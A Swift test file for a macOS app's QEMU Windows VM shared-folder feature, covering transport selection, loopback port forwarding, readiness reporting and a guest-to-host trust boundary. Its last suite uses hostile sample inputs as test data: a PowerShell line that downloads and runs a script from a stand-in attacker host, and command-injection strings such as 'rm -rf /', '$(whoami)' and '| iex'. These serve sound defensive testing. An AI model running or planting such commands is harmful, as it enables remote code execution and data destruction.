import Foundation
import Testing

@testable import VeilHostCore

@Suite("Live shared folder transport")
struct SharedFolderTransportTests {
    @Test("defaults to the transport that needs nothing installed on either side")
    func defaultsToGuestServedTransport() {
        let selection = QEMUWindowsSharedFolderTransport.selected(from: nil)

        // virtio-9p has no Windows driver, virtio-fs has no macOS host daemon, and QEMU's built-in SMB
        // needs a Samba build that does not work as a non-root user on macOS. The guest-served share is
        // the only one where both halves already exist.
        #expect(selection.transport == .guestSMB)
        #expect(selection.warning == nil)
        #expect(selection.isExplicit == false)
    }

    @Test("treats blank and whitespace overrides as unset")
    func treatsBlankOverrideAsUnset() {
        for rawValue in ["", "   ", "\n"] {
            let selection = QEMUWindowsSharedFolderTransport.selected(from: rawValue)

            #expect(selection.transport == .guestSMB, "\(rawValue.debugDescription)")
            #expect(selection.isExplicit == false, "\(rawValue.debugDescription)")
        }
    }

    @Test("accepts every supported transport by name")
    func acceptsEverySupportedTransport() {
        for transport in QEMUWindowsSharedFolderTransport.allCases {
            let selection = QEMUWindowsSharedFolderTransport.selected(from: " \(transport.rawValue) ")

            #expect(selection.transport == transport)
            #expect(selection.warning == nil)
            #expect(selection.isExplicit)
        }
    }

    @Test("falls back with a warning that lists what is supported")
    func fallsBackWithWarningForUnknownTransport() {
        let selection = QEMUWindowsSharedFolderTransport.selected(from: "virtio-9p")

        #expect(selection.transport == .guestSMB)
        #expect(selection.isExplicit)
        let warning = try? #require(selection.warning)
        #expect(warning?.contains("VEIL_QEMU_SHARED_FOLDER=virtio-9p") == true)
        #expect(warning?.contains("guest-smb") == true)
        #expect(warning?.contains("host-smb") == true)
        #expect(warning?.contains("none") == true)
    }

    @Test("keeps the disabled case away from Optional.none at call sites")
    func keepsDisabledCaseDistinctFromOptionalNone() {
        #expect(QEMUWindowsSharedFolderTransport.disabled.rawValue == "none")
        #expect(QEMUWindowsSharedFolderTransport.disabled.isEnabled == false)
        #expect(QEMUWindowsSharedFolderTransport.guestSMB.isEnabled)
        #expect(QEMUWindowsSharedFolderTransport.hostSMB.isEnabled)
    }

    @Test("binds the guest SMB forward to loopback only")
    func bindsForwardToLoopbackOnly() {
        let clause = try? #require(QEMUWindowsSharedFolderTransport.guestSMB.hostForwardClause)

        // An empty host address binds every interface, which would publish the guest's SMB server to
        // the local network instead of only to this Mac.
        #expect(clause == "hostfwd=tcp:127.0.0.1:18445-:445")
        #expect(clause?.contains("tcp::") == false)
    }

    @Test("adds no port forward for transports that do not need one")
    func addsNoForwardWhereUnneeded() {
        // The guest reaches a host-served share through the usermode gateway, and a disabled share has
        // nothing to reach, so neither maps a host port.
        #expect(QEMUWindowsSharedFolderTransport.hostSMB.hostForwardClause == nil)
        #expect(QEMUWindowsSharedFolderTransport.disabled.hostForwardClause == nil)
    }

    @Test("mount URL, mount path, and share name stay consistent")
    func mountDetailsStayConsistent() {
        let transport = QEMUWindowsSharedFolderTransport.guestSMB
        let url = try? #require(transport.hostMountURL)
        let path = try? #require(transport.expectedHostMountPath)

        #expect(url == "smb://127.0.0.1:18445/VeilShared")
        #expect(url?.hasSuffix("/\(QEMUWindowsSharedFolderTransport.shareName)") == true)
        #expect(path == "/Volumes/VeilShared")
        #expect(path?.hasSuffix("/\(QEMUWindowsSharedFolderTransport.shareName)") == true)
        #expect(transport.expectedGuestDirectoryPath == #"C:\VeilShared"#)
    }

    @Test("only the host-served transport exposes a guest mount command")
    func onlyHostServedTransportExposesGuestMountCommand() {
        let command = try? #require(QEMUWindowsSharedFolderTransport.hostSMB.guestMountCommand)

        #expect(command?.contains(#"\\10.0.2.2\"#) == true)
        #expect(QEMUWindowsSharedFolderTransport.guestSMB.guestMountCommand == nil)
        #expect(QEMUWindowsSharedFolderTransport.disabled.guestMountCommand == nil)
        #expect(QEMUWindowsSharedFolderTransport.hostSMB.requiresHostSMBServer)
        #expect(QEMUWindowsSharedFolderTransport.guestSMB.requiresHostSMBServer == false)
    }
}

@Suite("Live shared folder capability")
struct SharedFolderCapabilityTests {
    private static let wiredArguments = [
        "-machine", "virt,highmem=on",
        "-netdev", "user,id=net0,hostfwd=tcp:127.0.0.1:18444-:18444,hostfwd=tcp:127.0.0.1:18445-:445"
    ]
    private static let unwiredArguments = [
        "-machine", "virt,highmem=on",
        "-netdev", "user,id=net0,hostfwd=tcp:127.0.0.1:18444-:18444"
    ]

    @Test("reports supported when the running plan carries the forward")
    func reportsSupportedWhenForwardIsWired() {
        let capability = VMSharedFolderCapabilityFactory.make(
            transport: .guestSMB,
            planArguments: Self.wiredArguments
        )

        #expect(capability.state == .supported)
        #expect(capability.isSupported)
        #expect(capability.isWiredIntoBootPlan)
        #expect(capability.shareName == "VeilShared")
        #expect(capability.hostMountURL == "smb://127.0.0.1:18445/VeilShared")
        #expect(capability.hostForwardClause == "hostfwd=tcp:127.0.0.1:18445-:445")
        #expect(capability.overrideEnvironmentVariable == "VEIL_QEMU_SHARED_FOLDER")
    }

    @Test("blames the port only when the port was actually checked and busy")
    func blamesPortOnlyWhenObserved() {
        let observed = VMSharedFolderCapabilityFactory.make(
            transport: .guestSMB,
            planArguments: Self.unwiredArguments,
            isHostPortAvailable: false
        )

        #expect(observed.state == .hostPortUnavailable)
        #expect(observed.detail.contains("18445"))
    }

    @Test("does not invent a cause for a missing forward it did not diagnose")
    func doesNotInventCauseForMissingForward() {
        for isHostPortAvailable in [true, nil] as [Bool?] {
            let capability = VMSharedFolderCapabilityFactory.make(
                transport: .guestSMB,
                planArguments: Self.unwiredArguments,
                isHostPortAvailable: isHostPortAvailable
            )

            // Claiming a port conflict that was never observed would send someone hunting a listener
            // that does not exist. The honest reading is that this VM started before sharing was on.
            #expect(capability.state == .forwardMissingFromPlan)
            #expect(capability.isSupported == false)
            #expect(capability.isWiredIntoBootPlan == false)
        }
    }

    @Test("reports the host-served direction as unsupported rather than broken")
    func reportsHostServedDirectionAsUnsupported() {
        let capability = VMSharedFolderCapabilityFactory.make(
            transport: .hostSMB,
            planArguments: Self.wiredArguments
        )

        #expect(capability.state == .unsupportedTransport)
        #expect(capability.isWiredIntoBootPlan == false)
        #expect(capability.hostForwardClause == nil)
        #expect(capability.detail.contains("every network interface"))
    }

    @Test("reports a deliberate opt-out as disabled, not as a failure")
    func reportsOptOutAsDisabled() {
        let capability = VMSharedFolderCapabilityFactory.make(
            transport: .disabled,
            planArguments: Self.wiredArguments
        )

        #expect(capability.state == .disabled)
        #expect(capability.detail.contains("VEIL_QEMU_SHARED_FOLDER=none"))
    }

    @Test("reports notConfigured when there is no plan to inspect")
    func reportsNotConfiguredWithoutAPlan() {
        let capability = VMSharedFolderCapabilityFactory.make(
            transport: .guestSMB,
            planArguments: nil
        )

        #expect(capability.state == .notConfigured)
        #expect(capability.detail.contains("prepare"))
    }

    @Test("never marks a non-supported capability as wired")
    func neverMarksNonSupportedCapabilityAsWired() {
        for transport in QEMUWindowsSharedFolderTransport.allCases {
            for planArguments in [Self.wiredArguments, Self.unwiredArguments, nil] as [[String]?] {
                let capability = VMSharedFolderCapabilityFactory.make(
                    transport: transport,
                    planArguments: planArguments
                )

                if !capability.isSupported {
                    #expect(capability.isWiredIntoBootPlan == false, "\(transport.rawValue)")
                }
            }
        }
    }
}

@Suite("Live shared folder host mount probe")
struct SharedFolderHostMountProbeTests {
    @Test("reports the mount when the volume directory is present")
    func reportsMountWhenVolumePresent() {
        let status = VMSharedFolderHostMountProbe.read(
            transport: .guestSMB,
            directoryExists: { $0 == "/Volumes/VeilShared" }
        )

        #expect(status.isMounted)
        #expect(status.mountPath == "/Volumes/VeilShared")
    }

    @Test("withholds a mount path when nothing is mounted")
    func withholdsMountPathWhenNotMounted() {
        let status = VMSharedFolderHostMountProbe.read(
            transport: .guestSMB,
            directoryExists: { _ in false }
        )

        #expect(status.isMounted == false)
        #expect(status.mountPath == nil)
        #expect(status.detail.contains("/Volumes/VeilShared"))
    }

    @Test("reports nothing to mount for transports macOS does not mount")
    func reportsNothingToMountForNonClientTransports() {
        for transport in [QEMUWindowsSharedFolderTransport.hostSMB, .disabled] {
            let status = VMSharedFolderHostMountProbe.read(
                transport: transport,
                directoryExists: { _ in true }
            )

            // Answering "mounted" here because some directory happened to exist would be a false
            // positive for a transport that never mounts anything on this Mac.
            #expect(status.isMounted == false, "\(transport.rawValue)")
            #expect(status.mountPath == nil, "\(transport.rawValue)")
        }
    }
}

@Suite("Live shared folder readiness")
struct SharedFolderReadinessTests {
    private static func capability(
        state: VMSharedFolderSupportState = .supported
    ) -> VMSharedFolderCapability {
        VMSharedFolderCapabilityFactory.make(
            transport: state == .supported ? .guestSMB : .hostSMB,
            planArguments: [
                "-netdev",
                "user,id=net0,hostfwd=tcp:127.0.0.1:18444-:18444,hostfwd=tcp:127.0.0.1:18445-:445"
            ]
        )
    }

    private static func guest(
        directoryExists: Bool = true,
        isShared: Bool = true,
        isWritable: Bool = true,
        serverListening: Bool = true,
        requiresElevation: Bool = false,
        requiresCredentials: Bool = true,
        shareCommand: String? = nil
    ) -> WindowsSharedFolderStatus {
        WindowsSharedFolderStatus(
            isSupported: true,
            shareName: "VeilShared",
            guestDirectoryPath: #"C:\VeilShared"#,
            directoryExists: directoryExists,
            isShared: isShared,
            isWritable: isWritable,
            serverListening: serverListening,
            requiresElevation: requiresElevation,
            requiresCredentials: requiresCredentials,
            shareCommand: shareCommand,
            recommendedAction: "mount-on-mac"
        )
    }

    private static func mounted(_ isMounted: Bool) -> VMSharedFolderHostMountStatus {
        VMSharedFolderHostMountStatus(
            isMounted: isMounted,
            mountPath: isMounted ? "/Volumes/VeilShared" : nil,
            detail: "test"
        )
    }

    @Test("reports ready only when all three parts agree")
    func reportsReadyOnlyWhenEverythingAgrees() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(),
            vmState: .running,
            guest: Self.guest(),
            hostMount: Self.mounted(true)
        )

        #expect(readiness == .ready)
    }

    @Test("blames a stopped VM before blaming the guest agent")
    func blamesStoppedVMBeforeGuestAgent() {
        for vmState in [VMRuntimeState.stopped, .starting, .suspended, .failed, .notConfigured] {
            let readiness = VMSharedFolderReportFactory.readiness(
                capability: Self.capability(),
                vmState: vmState,
                guest: nil,
                hostMount: Self.mounted(false)
            )

            // An agent that does not answer while Windows is off is expected, not a fault. Reporting it
            // as an agent problem sends the user diagnosing the wrong thing.
            #expect(readiness == .awaitingVM, "\(vmState.rawValue)")
        }
    }

    @Test("reports an unreachable agent separately from a missing share")
    func reportsUnreachableAgentSeparately() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(),
            vmState: .running,
            guest: nil,
            hostMount: Self.mounted(false)
        )

        #expect(readiness == .awaitingGuestAgent)
    }

    @Test("treats an unreachable SMB server as not shared")
    func treatsUnreachableServerAsNotShared() {
        // A share the Mac cannot connect to is indistinguishable from no share, so a share that exists
        // behind a closed firewall must not read as ready.
        for guest in [
            Self.guest(isShared: false, isWritable: false, requiresElevation: true, shareCommand: "New-SmbShare ..."),
            Self.guest(isWritable: false),
            Self.guest(serverListening: false)
        ] {
            let readiness = VMSharedFolderReportFactory.readiness(
                capability: Self.capability(),
                vmState: .running,
                guest: guest,
                hostMount: Self.mounted(true)
            )

            #expect(readiness == .awaitingGuestShare)
        }
    }

    @Test("reports an unmounted but guest-ready share as awaiting the mount")
    func reportsUnmountedShareAsAwaitingMount() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(),
            vmState: .running,
            guest: Self.guest(),
            hostMount: Self.mounted(false)
        )

        #expect(readiness == .awaitingHostMount)
    }

    @Test("an unsupported capability is unavailable whatever else is true")
    func unsupportedCapabilityIsAlwaysUnavailable() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(state: .unsupportedTransport),
            vmState: .running,
            guest: Self.guest(),
            hostMount: Self.mounted(true)
        )

        #expect(readiness == .unavailable)
    }

    @Test("every readiness state produces at least one next action")
    func everyReadinessStateProducesNextActions() {
        for readiness in [
            VMSharedFolderReadiness.ready,
            .awaitingVM,
            .awaitingGuestAgent,
            .awaitingGuestShare,
            .awaitingHostMount,
            .unavailable
        ] {
            let actions = VMSharedFolderReportFactory.nextActions(
                readiness: readiness,
                capability: Self.capability(),
                guest: Self.guest()
            )

            #expect(!actions.isEmpty, "\(readiness.rawValue)")
        }
    }

    @Test("a ready report points away from the capped one-shot copy path")
    func readyReportPointsAwayFromCappedCopyPath() {
        let actions = VMSharedFolderReportFactory.nextActions(
            readiness: .ready,
            capability: Self.capability(),
            guest: Self.guest()
        )

        #expect(actions.joined(separator: " ").contains("50 MB"))
        #expect(actions.joined(separator: " ").contains("/Volumes/VeilShared"))
    }

    @Test("an elevation-blocked share hands back the exact command to run")
    func elevationBlockedShareHandsBackTheCommand() {
        let actions = VMSharedFolderReportFactory.nextActions(
            readiness: .awaitingGuestShare,
            capability: Self.capability(),
            guest: Self.guest(
                isShared: false,
                isWritable: false,
                requiresElevation: true,
                shareCommand: "New-SmbShare -Name VeilShared -Path C:\\VeilShared -FullAccess $env:USERNAME"
            )
        )

        #expect(actions.contains(where: { $0.contains("New-SmbShare -Name VeilShared") }))
    }

    @Test("a firewall instruction says the guest network is isolated")
    func firewallInstructionSaysNetworkIsIsolated() {
        let actions = VMSharedFolderReportFactory.nextActions(
            readiness: .awaitingGuestShare,
            capability: Self.capability(),
            guest: Self.guest(isShared: false, isWritable: false, serverListening: false, requiresElevation: true, shareCommand: "New-SmbShare ...")
        )
        let joined = actions.joined(separator: " ")

        // Told to open SMB with no context, a user reasonably assumes they are exposing SMB to their own
        // network rather than to an isolated NAT only this Mac can reach.
        #expect(joined.contains("Enable-NetFirewallRule"))
        #expect(joined.contains("usermode NAT"))
    }

    @Test("an unreachable agent covers an agent that predates this protocol")
    func unreachableAgentCoversOlderAgent() {
        let actions = VMSharedFolderReportFactory.nextActions(
            readiness: .awaitingGuestAgent,
            capability: Self.capability(),
            guest: nil
        )
        let joined = actions.joined(separator: " ")

        // An older agent answers health without a sharedFolder block, which looks identical to an
        // unreachable one from here.
        #expect(joined.contains("guest-agent-wait"))
        #expect(joined.contains("qemu-install-agent"))
    }

    @Test("the unsupported host-served direction offers the transport that works")
    func unsupportedHostServedDirectionOffersWorkingTransport() {
        let actions = VMSharedFolderReportFactory.nextActions(
            readiness: .unavailable,
            capability: Self.capability(state: .unsupportedTransport),
            guest: nil
        )
        let joined = actions.joined(separator: " ")

        #expect(joined.contains("guest-smb"))
        #expect(joined.contains("every network interface"))
    }

    @Test("the report keeps the macOS staging folder distinct from the share")
    func reportKeepsStagingFolderDistinctFromShare() {
        let report = VMSharedFolderReportFactory.make(
            generatedAt: Date(timeIntervalSince1970: 1_785_000_000),
            vmState: .running,
            capability: Self.capability(),
            guest: Self.guest(),
            hostMount: Self.mounted(true),
            hostStagingFolderPath: "/Users/test/Veil Shared"
        )

        // VMProfile.sharedFolderPath is named like the feature but holds VeilAutoInstall.iso and was
        // never shared with Windows.
        #expect(report.hostStagingFolderPath == "/Users/test/Veil Shared")
        #expect(report.hostStagingFolderPath != report.hostMount.mountPath)
        #expect(report.hostStagingFolderPath != report.capability.expectedGuestDirectoryPath)
        #expect(report.kind == "vmSharedFolderStatus")
        #expect(report.readiness == .ready)
    }
}

/// `expectedGuestDirectoryPath` has always documented that "the guest agent reports the path it actually used,
/// and a mismatch between the two is visible in the report rather than hidden". Nothing compared them, so the
/// host could report `ready` and tell the user to mount `smb://127.0.0.1:18445/VeilShared` while the guest had
/// published something else entirely.
///
/// The second half of this suite is sharper. `guest.shareCommand` is guest-supplied text, and it was
/// interpolated into an instruction telling the user to run it **in an administrator PowerShell** — so a
/// compromised guest chose the text of an elevated command Veil vouched for.
@Suite("Shared folder trust boundary")
struct SharedFolderTrustBoundaryTests {
    private static func capability() -> VMSharedFolderCapability {
        VMSharedFolderCapabilityFactory.make(
            transport: .guestSMB,
            planArguments: [
                "-netdev",
                "user,id=net0,hostfwd=tcp:127.0.0.1:18444-:18444,hostfwd=tcp:127.0.0.1:18445-:445"
            ]
        )
    }

    private static func guest(
        shareName: String = "VeilShared",
        guestDirectoryPath: String = #"C:\VeilShared"#,
        requiresElevation: Bool = false,
        shareCommand: String? = nil
    ) -> WindowsSharedFolderStatus {
        WindowsSharedFolderStatus(
            isSupported: true,
            shareName: shareName,
            guestDirectoryPath: guestDirectoryPath,
            directoryExists: true,
            isShared: true,
            isWritable: true,
            serverListening: true,
            requiresElevation: requiresElevation,
            requiresCredentials: true,
            shareCommand: shareCommand,
            recommendedAction: "mount-on-mac"
        )
    }

    private static func mounted() -> VMSharedFolderHostMountStatus {
        VMSharedFolderHostMountStatus(isMounted: true, mountPath: "/Volumes/VeilShared", detail: "test")
    }

    @Test("reports ready when the guest published exactly what Veil asked for")
    func readyOnMatch() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(),
            vmState: .running,
            guest: Self.guest(),
            hostMount: Self.mounted()
        )

        #expect(readiness == .ready)
    }

    @Test("refuses to report ready when the guest published a different share name")
    func notReadyOnShareNameMismatch() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(),
            vmState: .running,
            guest: Self.guest(shareName: "SomethingElse"),
            hostMount: Self.mounted()
        )

        // Reporting ready here would tell the user to mount a share Veil never asked for.
        #expect(readiness != .ready)
    }

    @Test("refuses to report ready when the guest published a different folder")
    func notReadyOnPathMismatch() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(),
            vmState: .running,
            guest: Self.guest(guestDirectoryPath: #"C:\Windows\System32"#),
            hostMount: Self.mounted()
        )

        #expect(readiness != .ready)
    }

    @Test("treats case differences as a match, because Windows does")
    func caseInsensitiveMatch() {
        let readiness = VMSharedFolderReportFactory.readiness(
            capability: Self.capability(),
            vmState: .running,
            guest: Self.guest(shareName: "veilshared", guestDirectoryPath: #"c:\veilshared"#),
            hostMount: Self.mounted()
        )

        // Windows share names and paths are case-insensitive, so treating these as a mismatch would break a
        // perfectly working share.
        #expect(readiness == .ready)
    }

    @Test("never puts guest text into a command it tells the user to run elevated")
    func elevatedCommandIsHostAuthored() {
        let malicious = "Invoke-WebRequest https://evil.example/x.ps1 -OutFile x.ps1; ./x.ps1"
        let actions = VMSharedFolderReportFactory.nextActions(
            readiness: .awaitingGuestShare,
            capability: Self.capability(),
            guest: Self.guest(requiresElevation: true, shareCommand: malicious)
        )

        let elevatedAction = actions.first { $0.contains("administrator") }
        #expect(elevatedAction != nil)
        // This is the whole finding: the text after "run:" used to be whatever the guest sent.
        #expect(actions.contains { $0.contains(malicious) } == false)
        #expect(elevatedAction?.contains("New-SmbShare -Name VeilShared") == true)
    }

    @Test("builds the same command the guest's own generator would")
    func hostCommandMatchesGuestForm() {
        // SharedFolderProbe.ShareCommand is
        // "New-SmbShare -Name {shareName} -Path {guestDirectoryPath} -FullAccess $env:USERNAME".
        // The host has both values already: it sent them in the request.
        let command = VMSharedFolderReportFactory.hostAuthoredShareCommand(capability: Self.capability())

        #expect(command == #"New-SmbShare -Name VeilShared -Path C:\VeilShared -FullAccess $env:USERNAME"#)
    }

    @Test("explains a mismatch without quoting the guest's values back")
    func mismatchActionDoesNotEchoGuestValues() {
        let actions = VMSharedFolderReportFactory.nextActions(
            readiness: .awaitingGuestShare,
            capability: Self.capability(),
            guest: Self.guest(shareName: "PwnedShare", guestDirectoryPath: #"C:\Users\Public"#)
        )

        #expect(actions.contains { $0.contains("different share than Veil asked for") })
        // The guest's strings are guest-controlled and this text reads as Veil's own description, so they stay
        // out of it.
        #expect(actions.contains { $0.contains("PwnedShare") } == false)
        #expect(actions.contains { $0.contains(#"C:\Users\Public"#) } == false)
    }

    @Test("refuses a value that could be read as shell syntax")
    func rejectsUnsafeCommandValues() {
        // These come from host constants today. The check guards against a future change that made them
        // configurable, so the safety of the displayed command does not depend on remembering why it was safe.
        #expect(VMSharedFolderReportFactory.safeCommandValue("VeilShared") == "VeilShared")
        #expect(VMSharedFolderReportFactory.safeCommandValue(#"C:\VeilShared"#) == #"C:\VeilShared"#)
        #expect(VMSharedFolderReportFactory.safeCommandValue("Veil; rm -rf /") == nil)
        #expect(VMSharedFolderReportFactory.safeCommandValue("Veil$(whoami)") == nil)
        #expect(VMSharedFolderReportFactory.safeCommandValue("Veil | iex") == nil)
        #expect(VMSharedFolderReportFactory.safeCommandValue("Veil Shared") == nil)
        #expect(VMSharedFolderReportFactory.safeCommandValue("") == nil)
        #expect(VMSharedFolderReportFactory.safeCommandValue(nil) == nil)
        #expect(VMSharedFolderReportFactory.safeCommandValue(String(repeating: "a", count: 129)) == nil)
    }

    @Test("falls back to host constants when a value is unsafe")
    func fallsBackToConstants() {
        var capability = Self.capability()
        capability.shareName = "Veil; iex"

        let command = VMSharedFolderReportFactory.hostAuthoredShareCommand(capability: capability)

        // Falling back beats showing nothing, and beats showing the unsafe value.
        #expect(command.contains("-Name VeilShared"))
        #expect(command.contains("iex") == false)
    }
}
